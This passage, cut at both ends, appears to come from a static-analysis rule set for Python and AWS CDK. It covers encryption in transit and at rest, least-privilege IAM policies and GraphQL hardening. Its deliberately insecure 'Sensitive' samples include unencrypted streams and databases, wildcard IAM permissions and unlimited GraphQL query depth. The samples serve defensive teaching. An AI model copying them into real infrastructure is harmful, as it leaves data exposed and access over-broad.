encryption is disabled by default\n    self,\n    \"unencrypted-implicit\",\n    replication_group_description=\"a test replication group\",\n    automatic_failover_enabled=False,\n    cache_subnet_group_name=\"test\",\n    engine=\"redis\",\n    engine_version=\"3.2.6\",\n    num_cache_clusters=1,\n    cache_node_type=\"cache.t2.micro\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/CfnStream.html\">aws_cdk.aws_kinesis.CfnStream</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_kinesis as kinesis,\n)\n\nkinesis.CfnStream( # Sensitive, encryption is disabled by default for CfnStreams\n    self,\n    \"cfnstream-implicit-unencrytped\",\n    shard_count=1\n)\n\nkinesis.CfnStream(self,\n    \"cfnstream-explicit-unencrytped\",\n    shard_count=1,\n    stream_encryption=None # Sensitive\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/Stream.html\">aws_cdk.aws_kinesis.Stream</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_kinesis as kinesis,\n)\n\nstream = kinesis.Stream(self,\n    \"stream-explicit-unencrypted\",\n    shard_count=1,\n    encryption=kinesis.StreamEncryption.UNENCRYPTED # Sensitive\n)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nurl = \"https://example.com\"\nurl = \"sftp://anonymous@example.com\"\nurl = \"ssh://anonymous@example.com\"\n\nimport ftplib\ncnx = ftplib.FTP_TLS(\"ftp.example.com\")\n\nimport smtplib\nsmtp = smtplib.SMTP(\"smtp.example.com\", port=587)\nsmtp.starttls(context=context)\n\nsmtp_ssl = smtplib.SMTP_SSL(\"smtp.gmail.com\", port=465)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationLoadBalancer.html\">aws_cdk.aws_elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nlb = elbv2.ApplicationLoadBalancer(\n    self,\n    \"LB\",\n    vpc=vpc,\n    internet_facing=True\n)\n\nlb.add_listener(\n    \"Listener-https-explicit\",\n    protocol=elbv2.ApplicationProtocol.HTTPS,\n    certificates=[elbv2.ListenerCertificate(\"certificateARN\")],\n    port=443,\n    open=True\n)\n\nlb.add_listener(\n    \"Listener-https-implicit\",\n    certificates=[elbv2.ListenerCertificate(\"certificateARN\")],\n    port=8443,\n    open=True\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationListener.html\">\naws_cdk.aws_elasticloadbalancingv2.ApplicationListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nelbv2.ApplicationListener(\n    self,\n    \"listener-https-explicit-const\",\n    load_balancer=lb,\n    protocol=elbv2.ApplicationProtocol.HTTPS,\n    certificates=[elbv2.ListenerCertificate(\"certificateARN\")],\n    port=444,\n    open=True\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkLoadBalancer.html\">aws_cdk.aws_elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\nlb = elbv2.NetworkLoadBalancer(\n    self,\n    \"LB\",\n    vpc=vpc,\n    internet_facing=True\n)\n\nlb.add_listener(\n    \"Listener-TLS-explicit\",\n    protocol=elbv2.Protocol.TLS,\n    certificates=[elbv2.ListenerCertificate(\"certificateARN\")],\n    port=443\n)\nlb.add_listener(\n    \"Listener-TLS-implicit\",\n    certificates=[elbv2.ListenerCertificate(\"certificateARN\")],\n    port=1024\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkListener.html\">aws_cdk.aws_elasticloadbalancingv2.NetworkListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nelbv2.NetworkListener(\n    self,\n    \"Listener-TLS-explicit\",\n    protocol=elbv2.Protocol.TLS,\n    certificates=[elbv2.ListenerCertificate(\"certificateARN\")],\n    port=443,\n    load_balancer=lb\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/CfnListener.html\">aws_cdk.aws_elasticloadbalancingv2.CfnListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nelbv2.CfnListener(\n    self,\n    \"listener-https\",\n    default_actions=[application_default_action],\n    load_balancer_arn=lb.load_balancer_arn,\n    protocol=\"HTTPS\",\n    port=443,\n    certificates=[elbv2.CfnListener.CertificateProperty(\n        certificate_arn=\"certificateARN\"\n    )]\n)\n\nelbv2.CfnListener(\n    self,\n    \"listener-tls\",\n    default_actions=[network_default_action],\n    load_balancer_arn=lb.load_balancer_arn,\n    protocol=\"TLS\",\n    port=1001,\n    certificates=[elbv2.CfnListener.CertificateProperty(\n        certificate_arn=\"certificateARN\"\n    )]\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancerListener.html\">aws_cdk.aws_elasticloadbalancing.LoadBalancerListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancing as elb,\n)\n\nelb.LoadBalancerListener(\n    external_port=10043,\n    external_protocol=elb.LoadBalancingProtocol.SSL,\n    internal_port=10043,\n    ssl_certificate_arn=\"certificateARN\"\n)\n\nelb.LoadBalancerListener(\n    external_port=10443,\n    external_protocol=elb.LoadBalancingProtocol.HTTPS,\n    internal_port=10443,\n    ssl_certificate_arn=\"certificateARN\"\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/CfnLoadBalancer.html\">aws_cdk.aws_elasticloadbalancing.CfnLoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancing as elb,\n)\n\nelb.CfnLoadBalancer(\n    self,\n    \"elb-ssl\",\n    listeners=[\n        elb.CfnLoadBalancer.ListenersProperty(\n            instance_port=\"10043\",\n            load_balancer_port=\"10043\",\n            protocol=\"ssl\",\n            ssl_certificate_id=CERTIFICATE_ARN\n        )\n    ],\n    subnets=vpc.select_subnets().subnet_ids\n)\n\nelb.CfnLoadBalancer(\n    self,\n    \"elb-https-dict\",\n    listeners=[\n        {\n            \"instancePort\":\"10443\",\n            \"loadBalancerPort\":\"10443\",\n            \"protocol\":\"https\",\n            \"sslCertificateId\":CERTIFICATE_ARN\n        }\n    ],\n    subnets=vpc.select_subnets().subnet_ids\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancer.html\">aws_cdk.aws_elasticloadbalancing.LoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancing as elb,\n)\n\nelb.LoadBalancer(\n    self,\n    \"elb-ssl\",\n    vpc=vpc,\n    listeners=[\n        {\n            \"externalPort\":10044,\n            \"externalProtocol\":elb.LoadBalancingProtocol.SSL,\n            \"internalPort\":10044,\n            \"sslCertificateArn\":\"certificateARN\"\n        },\n        {\n            \"externalPort\":10444,\n            \"externalProtocol\":elb.LoadBalancingProtocol.HTTPS,\n            \"internalPort\":10444,\n            \"sslCertificateArn\":\"certificateARN\"\n        }\n    ]\n)\n\nloadBalancer = elb.LoadBalancer(\n        self,\n        \"elb-multi-listener\",\n        vpc=vpc\n)\nloadBalancer.add_listener(\n    external_port=10045,\n    external_protocol=elb.LoadBalancingProtocol.SSL,\n    internal_port=10045,\n    ssl_certificate_arn=\"certificateARN\"\n)\nloadBalancer.add_listener(\n    external_port=10445,\n    external_protocol=elb.LoadBalancingProtocol.HTTPS,\n    internal_port=10445,\n    ssl_certificate_arn=\"certificateARN\"\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticache/CfnReplicationGroup.html\">aws_cdk.aws_elasticache.CfnReplicationGroup</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticache as elasticache\n)\n\nelasticache.CfnReplicationGroup(\n    self,\n    \"encrypted-explicit\",\n    replication_group_description=\"a test replication group\",\n    automatic_failover_enabled=False,\n    transit_encryption_enabled=True,\n    cache_subnet_group_name=\"test\",\n    engine=\"redis\",\n    engine_version=\"3.2.6\",\n    num_cache_clusters=1,\n    cache_node_type=\"cache.t2.micro\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/CfnStream.html\">aws_cdk.aws_kinesis.CfnStream</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_kinesis as kinesis,\n)\n\nkinesis.CfnStream(\n    self,\n    \"cfnstream-explicit-encrytped\",\n    shard_count=1,\n    stream_encryption=kinesis.CfnStream.StreamEncryptionProperty(\n        encryption_type=\"KMS\",\n        key_id=\"alias/aws/kinesis\"\n    )\n)\n\nstream = kinesis.CfnStream(\n    self,\n    \"cfnstream-explicit-encrytped-dict\",\n    shard_count=1,\n    stream_encryption={\n        \"encryptionType\": \"KMS\",\n        \"keyId\": \"alias/aws/kinesis\"\n    }\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/Stream.html\">aws_cdk.aws_kinesis.Stream</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_kinesis as kinesis,\n    aws_kms as kms\n)\n\nstream = kinesis.Stream( # Encryption is enabled by default for Streams\n    self,\n    \"stream-implicit-encrypted\",\n    shard_count=1\n)\n\nstream = kinesis.Stream(\n    self,\n    \"stream-explicit-encrypted-managed\",\n    shard_count=1,\n    encryption=kinesis.StreamEncryption.MANAGED\n)\n\nkey = kms.Key(self, \"managed_key\")\nstream = kinesis.Stream(\n    self,\n    \"stream-explicit-encrypted-selfmanaged\",\n    shard_count=1,\n    encryption=kinesis.StreamEncryption.KMS,\n    encryption_key=key\n)\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6304": {
        "name": "Policies granting access to all resources of an account are security-sensitive",
        "htmlDesc": "<p>A policy that allows identities to access all resources in an AWS account may violate <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity has permission to access\nall resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive\ninformation will occur.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The AWS account has more than one resource with different levels of sensitivity.</p>\n<p>A risk exists if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is\nto organize or <a\nhref=\"https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/\">tag</a>\nresources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>The wildcard <code>\"*\"</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all\npolicies of the account:</p>\n<pre>\nfrom aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement\n\nPolicyDocument(\n    statements=[\n        PolicyStatement(\n            effect=Effect.ALLOW,\n            actions=\"iam:CreatePolicyVersion\",\n            resources=[\"*\"] # Sensitive\n        )\n    ]\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>Restrict the update permission to the appropriate subset of policies:</p>\n<pre>\nfrom aws_cdk import Aws\nfrom aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement\n\nPolicyDocument(\n    statements=[\n        PolicyStatement(\n            effect=Effect.ALLOW,\n            actions=\"iam:CreatePolicyVersion\",\n            resources=[f\"arn:aws:iam::{Aws.ACCOUNT_ID}:policy/team1/*\"]\n        )\n    ]\n)\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>\n  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S6303": {
        "name": "Using unencrypted RDS DB resources is security-sensitive",
        "htmlDesc": "<p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,\nsnapshots, and cluster metadata.</p>\n<p>This situation can occur in a variety of scenarios, such as:</p>\n<ul>\n  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>\n  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>\n</ul>\n<p>After a successful intrusion, the underlying applications are exposed to:</p>\n<ul>\n  <li> theft of intellectual property and/or personal data </li>\n  <li> extortion </li>\n  <li> denial of services and security bypasses via data corruption or deletion </li>\n</ul>\n<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is\nrequired as encryption at rest is fully managed by AWS.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html\">aws_cdk.aws_rds.DatabaseCluster</a> and <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html\">aws_cdk.aws_rds.DatabaseInstance</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_rds as rds\n)\n\nclass DatabaseStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        rds.DatabaseCluster( # Sensitive, unencrypted by default\n            self,\n            \"example\"\n        )\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html\">aws_cdk.aws_rds.CfnDBCluster</a> and <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\">aws_cdk.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_rds as rds\n)\n\nclass DatabaseStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        rds.CfnDBCluster( # Sensitive, unencrypted by default\n            self,\n            \"example\"\n        )\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html\">aws_cdk.aws_rds.DatabaseCluster</a> and <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html\">aws_cdk.aws_rds.DatabaseInstance</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_rds as rds\n)\n\nclass DatabaseStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        rds.DatabaseCluster(\n            self,\n            \"example\",\n            storage_encrypted=True\n        )\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html\">aws_cdk.aws_rds.CfnDBCluster</a> and <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\">aws_cdk.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_rds as rds\n)\n\nclass DatabaseStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        rds.CfnDBCluster(\n            self,\n            \"example\",\n            storage_encrypted=True\n        )\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html\">AWS Documentation</a> - Encrypting Amazon RDS\n  resources </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6785": {
        "name": "GraphQL queries should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<p>GraphQL servers are vulnerable to Denial of Service attacks when they fail to limit the depth of queries. In such a case, an attacker is able to\ncraft complex, deeply nested queries to make the application unwillingly consume an important amount of resources.</p>\n<h2>Why is this an issue?</h2>\n<p>When a server receives a deeply nested query, it attempts to resolve all the requested data. This process can consume a substantial amount of\ncomputational resources, leading to a slowdown in server response times.</p>\n<h3>What is the potential impact?</h3>\n<p>A server that faces a resource exhaustion situation can become unstable. The exact impact will depend on how the affected application is deployed\nand how well the hosting server configuration is hardened.</p>\n<p>In the worst case, when the application is deployed in an uncontained environment, directly on its host system, the memory exhaustion will affect\nthe whole hosting server. The server’s operating system might start killing arbitrary memory-intensive processes, including the main application or\nother sensitive ones. This will result in a general operating failure, also known as a Denial of Service (DoS).</p>\n<p>In cases where the application is deployed in a virtualized or otherwise contained environment, or where resource usage limits are in place, the\nconsequences are limited to the vulnerable application only. In that case, other processes and applications hosted on the same server may keep on\nrunning without perturbation. The vulnerable application will still stop working properly.</p>\n<p>In general, that kind of DoS attack can have severe financial consequences. They are particularly important when the affected systems are\nbusiness-critical.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom graphql_server.flask import GraphQLView\n\napp.add_url_rule(\"/api\",\n    view_func=GraphQLView.as_view(  # Noncompliant\n        name=\"api\",\n        schema=schema,\n    )\n)\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom graphql_server.flask import GraphQLView\nfrom graphene.validation import depth_limit_validator\n\napp.add_url_rule(\"/api\",\n    view_func=GraphQLView.as_view(\n        name=\"api\",\n        schema=schema,\n        validation_rules=[\n           depth_limit_validator(10) # Choose a value that fits your application's requirements\n        ]\n    )\n)\n</pre>\n<h3>How does this work?</h3>\n<h4>Avoid circular references</h4>\n<p>A prerequisite for deeply nested query to be executed is the presence of circular references in the database schema. Avoid or minimize circular\nreferences when designing the application’s database schema.</p>\n<h4>Set limits</h4>\n<p>Limit the depth of the queries your server will accept. By setting a maximum depth, you can ensure that excessively nested queries are rejected.\nRemember, the values for maximum depth and complexity should be set according to your application’s specific needs. Setting these limits too low could\nrestrict legitimate queries, while setting them too high could leave your server vulnerable to attacks.</p>\n<p>The easiest way to set such a limit is to use the query validation API available from Graphene 3. Applications running Graphene 2 should consider\nupgrading to Graphene 3 to benefit from this API.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-707 - Allocation of Resources Without Limits or Throttling</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6302": {
        "name": "Policies granting all privileges are security-sensitive",
        "htmlDesc": "<p>A policy that grants all permissions may indicate an improper access control, which violates <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity is granted full\npermissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources\nmay occur and therefore result in loss of information.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Identities obtaining all the permissions:</p>\n<ul>\n  <li> only require a subset of these permissions to perform the intended function. </li>\n  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start\nwith the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in\nproduction, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>\n<h2>Sensitive Code Example</h2>\n<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>\n<pre>\nfrom aws_cdk.aws_iam import PolicyStatement, Effect\n\nPolicyStatement(\n    effect=Effect.ALLOW,\n    actions=[\"*\"], # Sensitive\n    resources=[\"arn:aws:iam:::user/*\"]\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>A customer-managed policy that grants only the required permissions:</p>\n<pre>\nfrom aws_cdk.aws_iam import PolicyStatement, Effect\n\nPolicyStatement(\n    effect=Effect.ALLOW,\n    actions=[\"iam:GetAccountSummary\"],\n    resources=[\"arn:aws:iam:::user/*\"]\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/understanding-roles\">Google Cloud Documentation</a> - Understanding roles </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S6308": {
        "name": "Using unencrypted OpenSearch domains is security-sensitive",
        "htmlDesc": "<p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>\n<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any\nversion), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>\n<ul>\n  <li> indices </li>\n  <li> logs </li>\n  <li> swap files </li>\n  <li> data in the application directory </li>\n  <li> automated snapshots </li>\n</ul>\n<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>\n<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/Domain.html\">aws_cdk.aws_opensearchservice.Domain</a>:</p>\n<pre>\nfrom aws_cdk.aws_opensearchservice import Domain, EngineVersion\n\nclass DomainStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n\n        Domain(self, \"Sensitive\",\n            version=EngineVersion.OPENSEARCH_1_3\n        ) # Sensitive, encryption is disabled by default\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/CfnDomain.html\">aws_cdk.aws_opensearchservice.CfnDomain</a>:</p>\n<pre>\nfrom aws_cdk.aws_opensearchservice import CfnDomain\n\nclass CfnDomainStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n\n        CfnDomain(self, \"Sensitive\") # Sensitive, encryption is disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/Domain.html\">aws_cdk.aws_opensearchservice.Domain</a>:</p>\n<pre>\nfrom aws_cdk.aws_opensearchservice import Domain, EncryptionAtRestOptions, EngineVersion\n\nclass DomainStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n\n        Domain(self, \"Compliant\",\n            version=EngineVersion.OPENSEARCH_1_3,\n            encryption_at_rest=EncryptionAtRestOptions(\n                enabled=True\n            )\n        )\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/CfnDomain.html\">aws_cdk.aws_opensearchservice.CfnDomain</a>:</p>\n<pre>\nfrom aws_cdk.aws_opensearchservice import CfnDomain\n\nclass CfnDomainStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n\n        CfnDomain(self, \"Compliant\",\n            encryption_at_rest_options=CfnDomain.EncryptionAtRestOptionsProperty(\n                enabled=True\n            )\n        )\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html\">AWS Documentation</a> - Encryption of\n  data at rest for Amazon OpenSearch Service </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6786": {
        "name": "GraphQL introspection should be disabled in production",
        "htmlDesc": "<p>This vulnerability exposes information about all the APIs available on a GraphQL API server. This information can be used to discover weaknesses in\nthe API that can be exploited.</p>\n<h2>Why is this an issue?</h2>\n<p>GraphQL introspection is a feature that allows client applications to query the schema of a GraphQL API at runtime. It provides a way for\ndevelopers to explore and understand the available data and operations supported by the API.</p>\n<p>This feature is a diagnostic tool that should only be used in the development phase as its presence also creates risks.</p>\n<p>Clear documentation and API references should be considered better discoverability tools for a public GraphQL API.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker can use introspection to identify all of the operations and data types supported by the server. This information can then be used to\nidentify potential targets for attacks.</p>\n<h4>Exploitation of private APIs</h4>\n<p>Even when a GraphQL API server is open to access by third-party applications, it may contain APIs that are intended only for private use.\nIntrospection allows these private APIs to be discovered.</p>\n<p>Private APIs often do not receive the same level of security rigor as public APIs. For example, they may skip input validation because the API is\nonly expected to be called from trusted applications. This can create avenues for attack that are not present on public APIs.</p>\n<h4>Exposure of sensitive data</h4>\n<p>GraphQL allows for multiple related objects to be retrieved using a single API call. This provides an efficient method of obtaining data for use in\na client application.</p>\n<p>An attacker may be able to use these relationships between objects to traverse the data structure. They may be able to find a link to sensitive\ndata that the developer did not intentionally make available.</p>\n<h2>How to fix 